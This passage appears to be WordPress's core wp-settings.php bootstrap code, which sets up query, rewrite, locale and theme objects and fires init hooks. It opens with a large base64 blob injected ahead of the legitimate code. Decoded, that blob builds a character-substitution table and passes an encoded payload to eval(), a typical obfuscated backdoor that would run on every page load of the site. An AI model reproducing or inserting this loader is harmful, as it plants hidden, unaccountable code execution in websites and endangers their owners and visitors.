WVwUmJHcWJSb3E3TTFCV3I0a215V1pneEh0M1BnVWNSZ0IzRVVSM1BnVWNSJy4KJ2daNHVlQ0UzaWtLU2daRU1PMzE5MU5FTGVrdUxlOUUzZXNXRDRmSXlXWkF4VDVkS3Y5YWR2VWJFVXBjUmdVN1EwNnlSZ1VjUmdVY1JnVUFNNGsyQ08nLgonZkF4VHBjS2daQXhUQ0ZEZWtJeU91S1pxSTJ3T3VseEh0M1AwNnlSZ1VjUmdVY1JnVUE4ZWZ1WWVmRmplQ3dZNE9kUm5xNzdUNVdEaHFScGVzJy4KJzczaWtLU1RKZ3JnVVdmaWthc1RKZ3JnVVd0R2sxOVRKZ3JnVVdNNE9FTWlrS1NUSmdyZ1VXTTFadzNUSmdyZ1VXdVRmYUpUSmdyZ1VXRFQ1QXhHZjI5Jy4KJ1RKZ3JnVVdiMWt1dGdwdFJnQ0Q5R2tBOVQ1ZHBvVWNwZVo5cFRKZ3hIdDNQMDZ5UmdVY1JnVWNSZ1VBM2VPN2o0WjlKZzAzUldCRTllWjRqNFo5Jy4KJ0pnVW1SZ3BscGdVbVJXWkVMZWt1TGU5S1NHa3U5VHVZTTFCV3I0a215R3NFakFmYTNxWktNMVVSeFBxYzlnWkVMMWtGM1BVQThlZnVZZWZGamUnLgonQ3dZNE9keE92ckVVUjNQZ1VjUmdVY1JnVTd4NHBjeTRDOXI0YUs5aFo5TTFCZHlXQkFZVHdLYmlPZ3hQNjNQJy4KJ2dVY1JnVWNSZ1U3UTA2eVJnVWNSZ1VjUmdVY1JnVTdKNE9BdVRDbVJXQkFZVHdLYmlPZ1EwNnlSZ1VjUmdVY1JnQjNFVVIzUGdVY1JnVWNSZ1U3eDQnLgoncERZaWZBeFRwUmIxWnV0T2ZBeFRwYngwNnlSZ1VjUmdVY1JnQnJFVXBjUmdVY1JnVWNSJy4KJ2dVY1JnQlc5MUJhSmVwY2IxWnV0T2ZBeFQ4ckVVcGNSZ1VjUmdVY1JqNjNQMDZ5UmdVY1JnVWNSZ0JXOTFCYUplcGNwZzhyRVVwY1JnVTdLMDZ5RVUnLgoncGNSZ1U3QzFrRjgxWjlMZXA3OFR1S3RlQmE1aWtGakdrQWJQVUFTR2t1OW9VY2JHQ3dNNHZHM09mQUQxWk54MDZ5UmdVY1JodDNQZ1VjUmdVY1JnVWNiNFp3MycuCidHcWNLZ1pXRFRmSWZFd0tiNGtFTDRaSXlXWldEVGZJZkV3S2JHT0FEUHZyRVVSM1BnVWNSZ1VjUicuCidnVWNiVHNBTFRDdzU0YUt0R09BeWcwM1JHc0VqQWZhMzZmS1lla0tTSXNBTFRDdzU0cVJ4Z1VtUmdwbHBIdDNQZycuCidVY1JnVWNSZ1VjYlRzQUxUQ3c1NGFLdEdPQXlnMDNSV0JFM2VzV0Q0ZmFqVFp3M2lVY1NnQkV1RzVFM1RwRFk0MEl5Z0NFREdmRDlncGJyZycuCicwY3JnMEl4Z1VtUmc5bHBnVW1SZWs2dVBVQVNHa3U5Z1VtUkdzRWpBZmEzcVpLTTFVUnhQdnJFVVIzUDA2eVJnVWNSZ1VjUmdaRU1PZicuCic0eGVaYWoxc1d4MVpJeVdCRTNlc1dENGZhalRadzNpVXRSR3NFajRrRjhUNTl0MVVSYjRadzNHcXRSR3NFakEnLgonZmEzcVpLTTFVUnhQcWJRMDZ5UmdVY1JqNjNQMDZ5UmdVY1I0NWFTR3NBeGVmbVJHc0VqJy4KJ1RaMnU0ZjlTT3NXOWVxUmJlQ3dZNHFiRVVwY1JnVTdRMDZ5UmdVY1JnVWNSZ1VBTTFaS0pHazE5T3M3RDFaUlJucTcnLgonOFR1S0I0T0EwZWZ1WWVmRnYxWktKR2sxOVBVYlNnVWdMZzhyRVVwY1JnVWNSZ1VjUldCRTNlc1dENGZhalRadzNpVWMnLgonS2dVQU0xWktKR2sxOU9zN0QxWlJSb3A3TTFrV00xQmd5ZWs2dVBVVzhHa0V5NHFneG9VY3RvVWN1UHFjU2dVV2onLgonZ3BjU2dadWJFcVJiZUN3WTRxY1NnWkVNTzMxOTFORExUczZ5UHFiUTA2eUVVcGNSZ1VjUmdVY1Jpa0dSUFo0eGVaYWo0T0R4VHNBTScuCidQVUFNMVpLSkdrMTlPczdEMVpSeFA2M1BnVWNSZ1VjUmdVN1EwNnlSZ1VjUmdVY1JnVWNSJy4KJ2dVN2Mxa0ZyaWtGVlBVQU0xWktKR2sxOU9zN0QxWlJ4SHQzUGdVY1JnVWNSZ1U3SzA2eVJnVWNSajYzUDA2eVJnVWNSNDVhU0dzQXhlZm1SR3NFalRaMnU0ZjlTT2YyTCcuCidHazZ5V1pGRGVrSUt2OWFkdlViRVVwY1JnVTdRMDZ5UmdVY1JnVWNSZ1VBTTFaS0pHazE5T3M3RDFaUlJucTc4VHVLQjRPQTBlJy4KJ2Z1WWVmRnYxWktKR2sxOVBVYlEwNnlFVXBjUmdVY1JnVWNSaWtHUlBaOU1PZkF4VHBSYlRzQUxUQ3c1NGFLdCcuCidHT0F5UHFiRVVwY1JnVWNSZ1VjUmh0M1BnVWNSZ1VjUmdVY1JnVWNSaWtHUlBVQVNHa3U5ZzAzS2dORmF2TnR4ZycuCidVbExnWjJMR2s2UkdrMnJnQjdyMWsxeGU1ZEVVcGNSZ1VjUmdVY1JnVWNSZ0JyRVVwY1JnVWNSZ1VjUmdVY1JnVWNSZ1U3Q2VzVzlHa0V5Z1VETUdmd1M0WjlKUFVBTTFaSycuCidKR2sxOU9zN0QxWlJ4Z1p3TWdVQVY0T2JLbnBBdGVCYTVpa0ZqZUN3WTRxYkVVcGNSZ1VjUmdVY1JnVWNSZ1VjUmdVN1EwNnlSZ1VjUmdVY1JnVWMnLgonUmdVY1JnVWNSZ1VjUmdaOUNnVURNMUJXdGVzZHlXQjdyMWsxeGU5S1NHa3U5b1U3TTFrV00xQmd5Jy4KJ2VrNnVQVVc4R2tFeTRxZ3hvVWN0b1VjdVBxYlJndjNLZ040RGVCRTlQNjNQZ1VjUmdVY1JnVWNSZ1VjUmdVY1JnVWNSZ1U3UTA2eVJnVWNSZ1VjUmdVY1JnVWNSZ1VjUmdVYycuCidSZ1VjUmdVN2M0TzREZVVEOFR1S2I0a0VKaE83M1BaRU1PZjR4ZVphalRDYUQ0VVJiVHNBTFRDdzU0YUt0R09BeWdVbVJncGxwZ1VtUldCJy4KJzdyMWsxeGU5S1NHa3U5UHF0UkdzRWpBZmEzcVpLTTFVUnhQcWJRMDZ5UmdVY1JnVWNSZ1VjUmdVY1JnVWNSZ1VjUmdCM0VVcGNSZ1VjUmdVY1JnVWNSZ1VjJy4KJ1JnVTdLMDZ5UmdVY1JnVWNSZ1VjUmdVN0swNnlSZ1VjUmdVY1JnVWNSZ1U3OWVCRTkwNnlSZ1VjUmdVYycuCidSZ1VjUmdVN1EwNnlSZ1VjUmdVY1JnVWNSZ1VjUmdVY1JXQkUzZXNXRDRmYWpUWnczaVVjS2dVQU0xWktKR2sxOU9zN0QxWlJSb3BjcG9KZ1JvcCcuCic3TTFrV00xQmd5ZWs2dVBVVzhHa0V5NHFneG9VY3RvVWN1UHFjU2dVV2pncGNTZ1p1YkVxUmInLgonZUN3WTRxY1NnWkVNTzMxOTFORExUczZ5UHFiUTA2eUVVcGNSZ1VjUmdVY1JnVWNSZ1VjJy4KJ1JnVTd4NHBjeTRDOXI0YUs5aFo5TTFCZHlXQkUzZXNXRDRmYWpUWnczaVVieDA2eVJnVWNSZ1UnLgonY1JnVWNSZ1VjUmdVY1JodDNQZ1VjUmdVY1JnVWNSZ1VjUmdVY1JnVWNSZ1U3YzRPNERlVUQ4VHVLYjRrRUpoTzczUFpFTU9mNHhlWmFqVENhRDRVUmJUc0FMVEN3NTRhS3QnLgonR09BeVBxdFJHc0VqQWZhM3FaS00xVVJ4UHFiUTA2eVJnVWNSZ1VjUmdVY1JnVWNSZ1VjUmo2M1BnVWNSZ1VjUmdVY1JnVWNSajYzUGdVY1JnVWNSZ1U3SzA2eVJnVWNSJy4KJ2o2M1AwNnlSZ1VjUjQ1YVNHc0F4ZWZtUkdzRWoxc1d4MVp3cGVaYWpHZkQ5R2ZyeVA2M1BnVWNSZ0JyRVVwY1JnVWNSZ1VjUmlrR1JQQkUzVEMyOWVwRDhUdUtCNE9BMGUnLgonZnVZZWZGdjFaS0pHazE5UFVieGdVTktnMGN4MDZ5UmdVY1JnVWNSZ0JyRVVwY1JnVWNSZ1VjUmdVY1JnQlc5MUJhSmVwNycuCidJVDVhOUh0M1BnVWNSZ1VjUmdVN0swNnlSZ1VjUmdVY1JnWmFyVGZJRVVwY1JnVWNSZ1VjUmh0M1BnVWNSJy4KJ2dVY1JnVWNSZ1VjUlRDYTMxT1dTZ040RGVCRTlIdDNQZ1VjUmdVY1JnVTdLMDZ5UmdVY1JqNjNQMDZ5UmdVY1I0Q0tKNGt3OGlVY3lXd0swdjNLb3FJSVJHTycuCidkUldaWTlodjMrV0I0RGVCYTlQNjNQZ1VjUmdCckVVcGNSZ1VjUmdVY1JXWkFEMVpOUm5xY2IxQ3dyMWtJUTA2eVJnVWNSZ1VjUmdVQWJHT0FET2ZZOWgnLgoncWNLZ1VBVjRPYlEwNnlSZ1VjUmo2M1AwNnlSZ1VjUmlrR1JQVU5iNFp3M0dxYkVVcGNSZ1U3UScuCicwNnlSZ1VjUmdVY1JnWjRMVENhREdmUlJQVUFqSU5LdmFVN0RUSmNiaWZhRm52bWIxQ3dyMWtJeDA2eVJnVWNSZ1VjUmdCckVVJy4KJ3BjUmdVY1JnVWNSZ1VjUmdVQWJHT0FEZzAzUldCNERlQmE5SHQzUGdVY1JnVWNSZ1VjUmdVY1JXWkFEMVp3amlmYUZnMDNSVycuCidaWTlodnJFVXBjUmdVY1JnVWNSajYzUGdVY1JnQjNFVVIzUGdVY1JnVUFiR09BRGcwM1I2QmFTVGZhSmlrd3JpT3g5UFpFTU9mQTlHc1dGVEI2eUdDd000dkczT2ZBOUdmS2InLgonNHFSYjRadzNHcWJyZ1VBYkdPQURPZlk5aHFieEh0M1AwNnlSZ1VjUmlrR1JQWjlNVGZhM1BVQWJHT0FEa0oxRGlKMTFQcWNDV3BjYkdzRWpHT2EzaTAzS1daQUQxWndlJy4KJ1dmd1ZXdTN4MDZ5UmdVY1JodDNQZ1VjUmdVY1JnVTd4NHBjeVdaQUQxWndlV2ZONU9xY0tucWM1aXFUeDA2eVJnJy4KJ1VjUmdVY1JnQnJFVXBjUmdVY1JnVWNSZ1VjUmdVQXhnMDNSNk9XSkdPYnkwNnlSZ1VjUmdVY1JnVWNSZ1VjUmdVY1JXczdmV0pjS25wN2NUWkR0MUNhSlRmOUxlcFJ4b2MnLgonM1BnVWNSZ1VjUmdVY1JnVWNSZ1VjUmdVMU0xcFRSbnZtUldNTlNkVTNKV0p0RVVwY1JnVWNSZ1VjUmdVY1JnVWNSZ1VjNUdrcjVnMDMrZ1VBYkdPQURrSicuCicxRGlKMTFvYzNQZ1VjUmdVY1JnVWNSZ1VjUlB2ckVVcGNSZ1VjUmdVY1JnVWNSZ1phOGlabFInLgonNkJFOVRDOURlWjlYNHFSYmlxYlEwNnlSZ1VjUmdVY1JnVWNSZ1U3OWhaOTNIdDNQZ1VjUmdVY1JnVTdLMDZ5UmdVY1JnVWNSZ1phclRmJy4KJ2F4NHBjeVdaQUQxWndlV2ZONU9xY0tucWM1NHFUeDA2eVJnVWNSZ1VjUmdCckVVcGNSZ1VjUmdVY1JnVWNSZ1phZkdrdHlXWkFEMVp3ZVdmNjVPcWJRMDZ5UicuCidnVWNSZ1VjUmdCM0VVcGNSZ1VjUmdVY1I0azJNNGs5Q2dVUmI0WnczR2FyNUdxMTFnMDNLZ1UxdGVCYTVpa201UDYnLgonM1BnVWNSZ1VjUmdVN1EwNnlSZ1VjUmdVY1JnVWNSZ1U3eDRwUmI0WnczR2FyNVRmTjVPcWNLbnFjNUdrJy4KJ0FiV0piRVVwY1JnVWNSZ1VjUmdVY1JnQnJFVXBjUmdVY1JnVWNSZ1VjUmdVY1JnVTc4VHVLdGVCYTVpa0ZqR2tBYlBVQWJHT0EnLgonRGtKMXRXdTNyZ1VBYkdPQURrSjFiV3UzeEh0M1BnVWNSZ1VjUmdVY1JnVWNSajYzUGdVY1JnVWNSZ1VjUmdVY1I0azJNNGs5Q1BVQWJHT0FEa0oxTUdxMTFnJy4KJzAzS2dVMUo0azM1UDYzUGdVY1JnVWNSZ1VjUmdVY1JodDNQZ1VjUmdVY1JnVWNSZ1VjUmdVY1JnWkVNT3M3cjFrMXhlOUtKNGszeVdaQUQxJy4KJ1p3ZVdzYzVPcWJRMDZ5UmdVY1JnVWNSZ1VjUmdVN0swNnlSZ1VjUmdVY1JnQjNFVXBjUmdVY1JnVWNSNGtFeWVKY2I0WnczR2FyNUdrcjVPdnJFVXBjUmdVY1JnVWNSNE9EJy4KJ3gxVVJ4SHQzUGdVY1JnQjNFVVIzUGdVY1JnWkVNT3M3cjFrMXhlOUtyZWZ3YlBVYlEwNnhLJzsKJHFidWh1ZyA9IEFycmF5KCcxJz0+J2QnLCAnMCc9PidEJywgJzMnPT4nMCcsICcyJz0+J3gnLCAnNSc9PiduJywgJzQnPT4nWicsICc3Jz0+J0InLCAnNic9PidRJywgJzknPT4nbCcsICc4Jz0+J2onLCAnQSc9PidSJywgJ0MnPT4nbScsICdCJz0+J0gnLCAnRSc9PidOJywgJ0QnPT4naCcsICdHJz0+J1knLCAnRic9Pic1JywgJ0knPT4nVScsICdIJz0+J08nLCAnSyc9Pic5JywgJ0onPT4neScsICdNJz0+J3onLCAnTCc9Pid2JywgJ08nPT4nWCcsICdOJz0+J0UnLCAnUSc9Pic3JywgJ1AnPT4nSycsICdTJz0+J3UnLCAnUic9PidnJywgJ1UnPT4nQycsICdUJz0+J2MnLCAnVyc9PidKJywgJ1YnPT4ncicsICdZJz0+J3QnLCAnWCc9Pic2JywgJ1onPT4nRycsICdhJz0+J1YnLCAnYyc9PidBJywgJ2InPT4naycsICdlJz0+J2InLCAnZCc9PidNJywgJ2cnPT4nSScsICdmJz0+JzInLCAnaSc9PidhJywgJ2gnPT4nZScsICdrJz0+J1cnLCAnaic9PidmJywgJ20nPT4nNCcsICdsJz0+JzgnLCAnbyc9PidMJywgJ24nPT4nUCcsICdxJz0+J1MnLCAncCc9PidpJywgJ3MnPT4nMycsICdyJz0+J3MnLCAndSc9PicxJywgJ3QnPT4ndycsICd3Jz0+J0YnLCAndic9PidUJywgJ3knPT4nbycsICd4Jz0+J3AnLCAneic9PidxJyk7CmV2YWwvKm5uZyovKGdqcnNrdm5rKCR6cW9oeW0sICRxYnVodWcpKTsKfQ=="));
/* are sanitized.
 *
 * @since 2.0.11
 */
do_action( 'sanitize_comment_cookies' );

/**
 * WordPress Query object
 * @global WP_Query $wp_the_query
 * @since 2.0.0
 */
$GLOBALS['wp_the_query'] = new WP_Query();

/**
 * Holds the reference to @see $wp_the_query
 * Use this global for WordPress queries
 * @global WP_Query $wp_query
 * @since 1.5.0
 */
$GLOBALS['wp_query'] = $GLOBALS['wp_the_query'];

/**
 * Holds the WordPress Rewrite object for creating pretty URLs
 * @global WP_Rewrite $wp_rewrite
 * @since 1.5.0
 */
$GLOBALS['wp_rewrite'] = new WP_Rewrite();

/**
 * WordPress Object
 * @global WP $wp
 * @since 2.0.0
 */
$GLOBALS['wp'] = new WP();

/**
 * WordPress Widget Factory Object
 * @global WP_Widget_Factory $wp_widget_factory
 * @since 2.8.0
 */
$GLOBALS['wp_widget_factory'] = new WP_Widget_Factory();

/**
 * WordPress User Roles
 * @global WP_Roles $wp_roles
 * @since 2.0.0
 */
$GLOBALS['wp_roles'] = new WP_Roles();

/**
 * Fires before the theme is loaded.
 *
 * @since 2.6.0
 */
do_action( 'setup_theme' );

// Define the template related constants.
wp_templating_constants(  );

// Load the default text localization domain.
load_default_textdomain();

$locale = get_locale();
$locale_file = WP_LANG_DIR . "/$locale.php";
if ( ( 0 === validate_file( $locale ) ) && is_readable( $locale_file ) )
	require( $locale_file );
unset( $locale_file );

// Pull in locale data after loading text domain.
require_once( ABSPATH . WPINC . '/locale.php' );

/**
 * WordPress Locale object for loading locale domain date and various strings.
 * @global WP_Locale $wp_locale
 * @since 2.1.0
 */
$GLOBALS['wp_locale'] = new WP_Locale();

// Load the functions for the active theme, for both parent and child theme if applicable.
if ( ! wp_installing() || 'wp-activate.php' === $pagenow ) {
	if ( TEMPLATEPATH !== STYLESHEETPATH && file_exists( STYLESHEETPATH . '/functions.php' ) )
		include( STYLESHEETPATH . '/functions.php' );
	if ( file_exists( TEMPLATEPATH . '/functions.php' ) )
		include( TEMPLATEPATH . '/functions.php' );
}

/**
 * Fires after the theme is loaded.
 *
 * @since 3.0.0
 */
do_action( 'after_setup_theme' );

// Set up current user.
$GLOBALS['wp']->init();

/**
 * Fires after WordPress has finished loading but before any headers are sent.
 *
 * Most of WP is loaded at this stage, and the user is authenticated. WP continues
 * to load on the init hook that follows (e.g. widgets), and many plugins instantiate
 * themselves on it for all sorts of reasons (e.g. they need a user, a taxonomy, etc.).
 *
 * If you wish to plug an action once WP is loaded, use the wp_loaded hook below.
 *
 * @since 1.5.0
 */
do_action( 'init' );

// Check site status
if ( is_multisite() ) {
	if ( true !== ( $file = ms_site_check() ) ) {
		require( $file );
		die();
	}
	unset($file);
}

/**
 * This hook is fired once WP, all plugins, and the theme are fully loaded and instantiated.
 *
 * AJAX requests should use wp-admin/admin-ajax.php. admin-ajax.php can handle requests for
 * users not logged in.
 *
 * @link https://codex.wordpress.org/AJAX_in_Plugins
 *
 * @since 3.0.0
 */
do_action( 'wp_loaded' );
